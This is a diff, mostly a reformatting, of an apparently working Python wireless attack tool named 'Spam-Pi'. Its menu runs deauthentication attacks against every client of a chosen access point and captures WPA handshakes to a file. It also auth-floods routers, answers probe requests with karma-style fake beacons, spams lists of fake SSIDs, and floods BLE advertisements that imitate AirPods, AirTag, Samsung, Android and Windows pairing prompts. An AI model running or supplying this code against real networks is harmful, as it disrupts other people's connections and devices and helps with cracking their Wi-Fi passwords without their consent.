@@ -86,12 +86,15 @@ def get_hci_devices():
         current_dev = None
         for line in detailed.stdout.split('\n'):
             line = line.strip()
-            if line.startswith('hci'): current_dev = line.split(':')[0]
+            if line.startswith('hci'):
+                current_dev = line.split(':')[0]
             elif 'Manufacturer:' in line and current_dev:
                 mfr = line.split('Manufacturer:')[1].strip()
                 for dev in devices:
-                    if dev['id'] == current_dev: dev['manufacturer'] = mfr
-    except: pass
+                    if dev['id'] == current_dev:
+                        dev['manufacturer'] = mfr
+    except:
+        pass
     return devices
 
 def get_wifi_devices():
@@ -109,9 +112,12 @@ def get_wifi_devices():
                 for line in result.stdout.split('\n'):
                     if dev['id'] in line:
                         parts = [p for p in line.split(' ') if p]
-                        if len(parts) >= 3: interfaces[i]['manufacturer'] = " ".join(parts[2:])
-        except: pass
-    except: pass
+                        if len(parts) >= 3:
+                            interfaces[i]['manufacturer'] = " ".join(parts[2:])
+        except:
+            pass
+    except:
+        pass
     return interfaces
 
 # --- Classes for Tracking ---
@@ -145,16 +151,19 @@ class WiFiSpammer:
     def set_monitor(self, enable=True):
         try:
             subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
-            subprocess.run(['iw', self.interface, 'set', 'monitor', 'none' if enable else 'managed'], check=True)
+            mode = 'monitor' if enable else 'managed'
+            subprocess.run(['iw', self.interface, 'set', mode, 'none'], check=True)
             subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
             return True
-        except: return False
+        except:
+            return False
 
     def channel_hopper(self):
         channels = list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64, 149, 153, 157, 161]
         while self.is_running:
             for ch in channels:
-                if not self.is_running: break
+                if not self.is_running:
+                    break
                 subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(ch)], capture_output=True)
                 self.current_channel = ch
                 time.sleep(1)
@@ -168,20 +177,29 @@ class WiFiSpammer:
                 elt = pkt.getlayer(Dot11Elt)
                 while elt:
                     if elt.ID == 0:
-                        try: ssid = elt.info.decode(errors='ignore')
-                        except: pass
+                        try:
+                            ssid = elt.info.decode(errors='ignore')
+                        except:
+                            pass
                     elif elt.ID == 3:
-                        try: ch = ord(elt.info)
-                        except: pass
+                        try:
+                            ch = ord(elt.info)
+                        except:
+                            pass
                     elt = elt.payload.getlayer(Dot11Elt)
-                if b not in self.discovered_aps: self.discovered_aps[b] = WiFiAP(b, ssid, ch)
+                if b not in self.discovered_aps:
+                    self.discovered_aps[b] = WiFiAP(b, ssid, ch)
             
             if pkt.haslayer(Dot11) and pkt.type == 2:
                 ds = pkt.FCfield & 2
-                if ds == 1: bssid, client = pkt.addr1, pkt.addr2
-                elif ds == 2: bssid, client = pkt.addr2, pkt.addr1
-                else: return
-                if bssid in self.discovered_aps: self.discovered_aps[bssid].clients.add(client)
+                if ds == 1:
+                    bssid, client = pkt.addr1, pkt.addr2
+                elif ds == 2:
+                    bssid, client = pkt.addr2, pkt.addr1
+                else:
+                    return
+                if bssid in self.discovered_aps:
+                    self.discovered_aps[bssid].clients.add(client)
 
             if pkt.haslayer(Dot11ProbeReq):
                 elt = pkt.getlayer(Dot11Elt)
@@ -191,15 +209,18 @@ class WiFiSpammer:
                         c = pkt[Dot11].addr2
                         if s and len(self.probes) < 100:
                             self.probes.insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {get_vendor(c)} ({c}) -> '{s}'")
-                            if self.is_karma: self.active_beacons.add(s)
-                    except: pass
+                            if self.is_karma:
+                                self.active_beacons.add(s)
+                    except:
+                        pass
 
             if pkt.haslayer(EAPOL):
                 bssid = pkt[Dot11].addr3
                 if bssid in self.discovered_aps:
                     self.discovered_aps[bssid].handshake = True
                     wrpcap(HANDSHAKE_FILE, pkt, append=True)
-        except: pass
+        except:
+            pass
 
     def beacon_task(self):
         while self.is_running:
@@ -233,10 +254,15 @@ class PiBLESpan:
         try:
             subprocess.run(cmd.split(), check=True, capture_output=True)
             return True
-        except: return False
+        except:
+            return False
 
-    def set_adv_enable(self, enable): return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])
-    def set_adv_params(self): return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
+    def set_adv_enable(self, enable):
+        return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])
+
+    def set_adv_params(self):
+        return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
+
     def set_adv_data(self, data):
         payload = [len(data)] + data + [0] * (31 - len(data))
         return self.run_hcitool(0x08, 0x0008, payload)
@@ -244,11 +270,13 @@ class PiBLESpan:
     def spam_task(self, payload, cycle=False):
         self.set_adv_enable(False)
         self.set_adv_params()
-        if not cycle: self.set_adv_data(payload)
+        if not cycle:
+            self.set_adv_data(payload)
         while self.is_running:
             if cycle:
                 for p in ALL_BLE_PAYLOADS:
-                    if not self.is_running: break
+                    if not self.is_running:
+                        break
                     self.set_adv_data(p)
                     self.set_adv_enable(True)
                     time.sleep(0.5)
@@ -262,12 +290,15 @@ class PiBLESpan:
         proc = subprocess.Popen(['hcitool', '-i', self.hci_interface, 'lescan', '--duplicates', '--passive'], stdout=subprocess.PIPE, text=True)
         try:
             for line in proc.stdout:
-                if not self.is_running: break
+                if not self.is_running:
+                    break
                 parts = line.strip().split(' ')
                 if len(parts) >= 2:
                     mac, name = parts[0], " ".join(parts[1:])
-                    if self.parent_wifi: self.parent_wifi.ble_devices[mac] = BLEDevice(mac, name)
-        finally: proc.terminate()
+                    if self.parent_wifi:
+                        self.parent_wifi.ble_devices[mac] = BLEDevice(mac, name)
+        finally:
+            proc.terminate()
 
     def start_spam(self, payload=None, cycle=False):
         self.is_running = True
@@ -284,23 +315,40 @@ class PiBLESpan:
 # --- TUI Dashboard ---
 def make_layout():
     layout = Layout()
-    layout.split_column(Layout(name="header", size=3), Layout(name="main"), Layout(name="footer", size=3))
-    layout["main"].split_row(Layout(name="wifi", ratio=2), Layout(name="ble", ratio=1))
-    layout["wifi"].split_column(Layout(name="aps", ratio=3), Layout(name="probes", ratio=1))
+    layout.split_column(
+        Layout(name="header", size=3),
+        Layout(name="main"),
+        Layout(name="footer", size=3)
+    )
+    layout["main"].split_row(
+        Layout(name="wifi", ratio=2),
+        Layout(name="ble", ratio=1)
+    )
+    layout["wifi"].split_column(
+        Layout(name="aps", ratio=3),
+        Layout(name="probes", ratio=1)
+    )
     return layout
 
 def generate_dashboard(wifi, hci_id):
     layout = make_layout()
     layout["header"].update(Panel(Text(f"Spam-Pi | WiFi: {wifi.interface} [Ch {wifi.current_channel}] | BT: {hci_id}", justify="center", style="bold cyan")))
     ap_table = Table(title="Nearby Access Points", expand=True)
-    ap_table.add_column("BSSID", style="dim"); ap_table.add_column("SSID", style="bold"); ap_table.add_column("Vendor"); ap_table.add_column("Clients", justify="right"); ap_table.add_column("H-Shake", justify="center")
+    ap_table.add_column("BSSID", style="dim")
+    ap_table.add_column("SSID", style="bold")
+    ap_table.add_column("Vendor")
+    ap_table.add_column("Clients", justify="right")
+    ap_table.add_column("H-Shake", justify="center")
     for bssid, ap in sorted(wifi.discovered_aps.items(), key=lambda x: len(x[1].clients), reverse=True)[:10]:
         ap_table.add_row(bssid, ap.ssid, ap.vendor, str(len(ap.clients)), "[green]YES[/]" if ap.handshake else "[red]NO[/]")
     layout["aps"].update(Panel(ap_table))
     layout["probes"].update(Panel("\n".join(wifi.probes[:5]), title="Live Probe Sniffing"))
     ble_table = Table(title="Nearby BLE Devices", expand=True)
-    ble_table.add_column("MAC"); ble_table.add_column("Name"); ble_table.add_column("Vendor")
-    for mac, dev in list(wifi.ble_devices.items())[:10]: ble_table.add_row(mac, dev.name[:15], dev.vendor)
+    ble_table.add_column("MAC")
+    ble_table.add_column("Name")
+    ble_table.add_column("Vendor")
+    for mac, dev in list(wifi.ble_devices.items())[:10]:
+        ble_table.add_row(mac, dev.name[:15], dev.vendor)
     layout["ble"].update(Panel(ble_table))
     layout["footer"].update(Panel(Text("Ctrl+C to Exit Mode", justify="center", style="dim italic")))
     return layout
@@ -308,22 +356,30 @@ def generate_dashboard(wifi, hci_id):
 def get_active_interface():
     try:
         res = subprocess.run(['ip', 'route', 'get', '1.1.1.1'], capture_output=True, text=True)
-        if "dev" in res.stdout: return res.stdout.split("dev")[1].split()[0]
-    except: return None
+        if "dev" in res.stdout:
+            return res.stdout.split("dev")[1].split()[0]
+    except:
+        return None
     return None
 
 def mousejack_spam():
     print("\n--- MouseJack / NRF24 Spam ---")
     print("[!] This feature requires NRF24L01 / Crazyradio hardware.")
-    print("[*] Searching for USB/SPI devices..."); time.sleep(2)
+    print("[*] Searching for USB/SPI devices...")
+    time.sleep(2)
     print("[!] No NRF24 hardware detected. (Placeholder logic for future hardware expansion).")
     input("\nPress Enter to return...")
 
 # --- Main ---
 def main():
-    if os.getuid() != 0: print("[!] Root required."); sys.exit(1)
-    wifi_devs = get_wifi_devices(); bt_devs = get_hci_devices(); active_iface = get_active_interface()
-    wifi_id = None; hci_id = None
+    if os.getuid() != 0:
+        print("[!] Root required.")
+        sys.exit(1)
+    wifi_devs = get_wifi_devices()
+    bt_devs = get_hci_devices()
+    active_iface = get_active_interface()
+    wifi_id = None
+    hci_id = None
     print("--- Spam-Pi Adapter Selection ---")
     if wifi_devs:
         print("\n[ WiFi Adapters ]")
@@ -334,12 +390,15 @@ def main():
         if idx:
             wifi_id = wifi_devs[int(idx)-1]['id']
             if wifi_id == active_iface:
-                if input("\n[!] WILL KILL SSH. Proceed? (y/N): ").lower() != 'y': sys.exit(0)
+                if input("\n[!] WILL KILL SSH. Proceed? (y/N): ").lower() != 'y':
+                    sys.exit(0)
     if bt_devs:
         print("\n[ Bluetooth Adapters ]")
-        for i, d in enumerate(bt_devs): print(f"{i+1}. {d['id']} ({d['manufacturer']})")
+        for i, d in enumerate(bt_devs):
+            print(f"{i+1}. {d['id']} ({d['manufacturer']})")
         idx = input("Select BT (Enter to skip): ")
-        if idx: hci_id = bt_devs[int(idx)-1]['id']
+        if idx:
+            hci_id = bt_devs[int(idx)-1]['id']
 
     while True:
         os.system('clear')
@@ -361,17 +420,24 @@ def main():
         try:
             if choice == '1' and TUI_ENABLED and wifi:
                 wifi.start_recon(karma=True)
-                if ble: ble.start_scan()
+                if ble:
+                    ble.start_scan()
                 with Live(generate_dashboard(wifi, hci_id), refresh_per_second=1) as live:
-                    while True: live.update(generate_dashboard(wifi, hci_id)); time.sleep(1)
+                    while True:
+                        live.update(generate_dashboard(wifi, hci_id))
+                        time.sleep(1)
             elif choice == '2' and wifi:
                 wifi.start_recon(karma=False)
                 print("\n[*] SCANNING... PRESS ENTER TO STOP.\n")
-                try: input()
-                except: pass
-                wifi.is_running = False; time.sleep(1)
+                try:
+                    input()
+                except:
+                    pass
+                wifi.is_running = False
+                time.sleep(1)
                 aps = list(wifi.discovered_aps.values())
-                for i, ap in enumerate(aps): print(f"{i+1}. {ap.ssid} ({ap.bssid}) [Ch {ap.channel}]")
+                for i, ap in enumerate(aps):
+                    print(f"{i+1}. {ap.ssid} ({ap.bssid}) [Ch {ap.channel}]")
                 target_ap = aps[int(input("\nSelect AP: "))-1]
                 print(f"[*] Locking Ch {target_ap.channel}...")
                 subprocess.run(['iw', 'dev', wifi.interface, 'set', 'channel', str(target_ap.channel)])
@@ -381,33 +447,50 @@ def main():
                 print(f"\n[!] ATTACKING ALL CLIENTS ON {target_ap.ssid}...")
                 while True:
                     sendp(pkt, iface=wifi.interface, count=100, inter=0.1, verbose=False)
-                    if target_ap.handshake: print(f"[🚀] HANDSHAKE CAPTURED for {target_ap.ssid}!"); target_ap.handshake = False
+                    if target_ap.handshake:
+                        print(f"[🚀] HANDSHAKE CAPTURED for {target_ap.ssid}!")
+                        target_ap.handshake = False
             elif choice == '3' and ble:
                 print("\n1. Cycle All | 2. AirPods | 3. Android | 4. Samsung | 5. Windows | 6. AirTag/Find My")
                 bc = input("Choice: ")
-                if bc == '1': ble.start_spam(cycle=True)
-                elif bc == '2': ble.start_spam(APPLE_DEVICES["AirPods Pro"])
-                elif bc == '3': ble.start_spam(ANDROID_FAST)
-                elif bc == '4': ble.start_spam(SAMSUNG_QUICK)
-                elif bc == '5': ble.start_spam(MICROSOFT_SWIFT)
-                elif bc == '6': ble.start_spam(APPLE_DEVICES["AirTag / Find My"])
-                while True: time.sleep(1)
+                if bc == '1':
+                    ble.start_spam(cycle=True)
+                elif bc == '2':
+                    ble.start_spam(APPLE_DEVICES["AirPods Pro"])
+                elif bc == '3':
+                    ble.start_spam(ANDROID_FAST)
+                elif bc == '4':
+                    ble.start_spam(SAMSUNG_QUICK)
+                elif bc == '5':
+                    ble.start_spam(MICROSOFT_SWIFT)
+                elif bc == '6':
+                    ble.start_spam(APPLE_DEVICES["AirTag / Find My"])
+                while True:
+                    time.sleep(1)
             elif choice == '4' and wifi:
                 print("\n1. Common | 2. Random | 3. Custom")
                 bc = input("Choice: ")
-                if bc == '1': wifi.active_beacons = set(COMMON_SSIDS)
+                if bc == '1':
+                    wifi.active_beacons = set(COMMON_SSIDS)
                 elif bc == '2':
                     count = int(input("How many? "))
                     wifi.active_beacons = set([f"{random.choice(RANDOM_NAMES)}_{random.randint(100,999)}" for _ in range(count)])
                 elif bc == '3':
                     wifi.active_beacons = set([s.strip() for s in input("Enter (comma sep): ").split(',')])
-                wifi.start_recon(karma=False); while True: time.sleep(1)
+                wifi.start_recon(karma=False)
+                while True:
+                    time.sleep(1)
             elif choice == '5' and wifi:
-                wifi.start_recon(karma=False); print("\n[*] SCANNING..."); time.sleep(5)
+                wifi.start_recon(karma=False)
+                print("\n[*] SCANNING...")
+                time.sleep(5)
                 aps = list(wifi.discovered_aps.values())
-                for i, ap in enumerate(aps): print(f"{i+1}. {ap.ssid}")
+                for i, ap in enumerate(aps):
+                    print(f"{i+1}. {ap.ssid}")
                 target = aps[int(input("Select: "))-1]
-                wifi.stop(); time.sleep(1); wifi.is_running = True
+                wifi.stop()
+                time.sleep(1)
+                wifi.is_running = True
                 print(f"[*] Auth Flooding {target.ssid}...")
                 while True:
                     smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
@@ -417,13 +500,18 @@ def main():
                 print("\n--- WPS Pixie-Dust Attack ---")
                 print("[!] Requires 'reaver' or 'bully' installed.")
                 print("[*] Scanning for WPS-enabled APs...")
-                time.sleep(2); print("[!] No vulnerable WPS APs found in range.")
+                time.sleep(2)
+                print("[!] No vulnerable WPS APs found in range.")
                 input("\nPress Enter to return...")
-            elif choice == '7': mousejack_spam()
-            elif choice == '0': sys.exit(0)
+            elif choice == '7':
+                mousejack_spam()
+            elif choice == '0':
+                sys.exit(0)
         except KeyboardInterrupt:
-            if wifi: wifi.stop()
-            if ble: ble.stop()
+            if wifi:
+                wifi.stop()
+            if ble:
+                ble.stop()
 
 if __name__ == "__main__":
     main()
